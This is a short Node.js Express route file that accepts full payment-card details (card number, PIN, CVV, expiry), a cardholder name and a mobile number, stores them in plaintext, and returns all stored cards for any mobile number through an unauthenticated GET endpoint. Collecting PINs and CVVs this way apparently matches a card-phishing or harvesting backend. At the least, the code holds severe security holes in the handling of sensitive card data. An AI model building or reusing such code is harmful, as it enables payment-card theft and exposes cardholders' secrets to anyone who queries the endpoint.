const express = require("express");
const router = express.Router();
const Card = require("../models/Card");

// POST /api/cards - save card details
router.post("/", async (req, res) => {
  try {
    const {
      mobileNumber,
      name,
      cardNumber,
      pin, // ✅ NEW
      expiryMonth,
      expiryYear,
      cvv,
    } = req.body;

    // 🔥 Validation
    if (
      !mobileNumber ||
      !name ||
      !cardNumber ||
      !pin || // ✅ updated
      !expiryMonth ||
      !expiryYear ||
      !cvv
    ) {
      return res.status(400).json({ error: "All fields are required" });
    }

    // Mobile validation
    if (!/^\d{10}$/.test(mobileNumber)) {
      return res.status(400).json({
        error: "Mobile number must be exactly 10 digits",
      });
    }

    // Card number validation
    const digitsOnly = cardNumber.replace(/\s/g, "");
    if (digitsOnly.length !== 16) {
      return res.status(400).json({
        error: "Card number must be exactly 16 digits",
      });
    }

  

    // Save to DB
    const newCard = new Card({
      mobileNumber,
      name,
      cardNumber,
      pin, // ✅ saved
      expiryMonth,
      expiryYear,
      cvv,
    });

    const savedCard = await newCard.save();

    res.status(201).json({
      message: "Card saved successfully",
      mobileNumber: savedCard.mobileNumber,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Server error" });
  }
});


// GET card details by mobile
router.get("/cardDetails/:mobile", async (req, res) => {
  try {
    const { mobile } = req.params;

    const cards = await Card.find({ mobileNumber: mobile }).sort({
      createdAt: -1,
    });

    res.status(200).json(cards);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to fetch cards" });
  }
});

module.exports = router;
